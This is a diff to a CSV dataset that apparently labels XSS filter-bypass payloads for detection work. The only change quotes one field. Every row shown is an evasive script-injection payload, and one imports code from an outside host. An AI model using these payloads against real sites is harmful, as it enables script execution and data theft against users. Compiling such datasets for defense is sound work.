@@ -313,7 +313,7 @@ https://waf-bypass.com/,"?><a/\test=?%26quot;x%26quot;?href=?%01javascript:/*%b1
 https://waf-bypass.com/,"<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;>",xss
 https://waf-bypass.com/,<marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>,xss
 https://waf-bypass.com/,<svg><circle><set onbegin=prompt(1) attributename=fill>,xss
-https://waf-bypass.com/,<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>,xss
+https://waf-bypass.com/,"<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>",xss
 https://waf-bypass.com/,%3balert`1`%3b,xss
 https://waf-bypass.com/,"asd""`> onpointerenter=x=prompt,x`XSS`",xss
 https://waf-bypass.com/,<x onauxclick=import('//1152848220/')>click,xss
